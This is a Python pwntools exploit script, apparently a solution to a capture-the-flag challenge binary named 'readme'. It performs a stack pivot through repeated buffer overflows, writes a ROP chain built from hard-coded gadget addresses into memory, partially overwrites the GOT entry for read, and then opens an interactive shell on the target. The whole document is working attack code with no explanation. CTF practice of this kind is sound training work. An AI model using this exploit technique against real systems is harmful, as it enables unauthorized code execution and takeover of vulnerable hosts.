#!/usr/bin/env python

from pwn import *
import time

# r = remote("csie.ctf.tw", 10135)
r = process('./readme', env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")})
context.arch = 'amd64'

main_read = 0x40062b
read_got = 0x601020
read_plt = 0x0000000004004c0
buf1 = 0x00602000 - 0x200
buf2 = buf1 - 0x200

pop_r12__pop_r13__pop_r14__pop_r15 = 0x4006ac
mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15 = 0x400690
pop_rsi_r15 = 0x00000000004006b1
pop_rdi = 0x00000000004006b3
leave = 0x400646
ret = 0x0000000000400499

def write_rop(addr, data):
    time.sleep(0.5)
    r.send('a' * 32 + flat([addr + 0x20, main_read]))
    time.sleep(0.5)
    r.send(data.ljust(32, '\x00') + flat(buf1 + 0x20, main_read))

rop = flat([
    0x1,

    pop_r12__pop_r13__pop_r14__pop_r15,
    buf2 + 19 * 0x8,
    0x2,
    0x0,
    0x0,
    mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,

    pop_rsi_r15,
    read_got,
    0,
    read_plt,

    read_plt,

    ret
    ])

r.recvuntil(':')
r.send('a' * 32 + flat([buf1, main_read]))

for i in range(0, len(rop), 32):
    write_rop(buf2 + i, rop[i: i + 32])

time.sleep(0.5)
r.send('a' * 32 + flat([buf2, leave]))
time.sleep(0.5)
r.send('\x74\x02')

r.interactive()
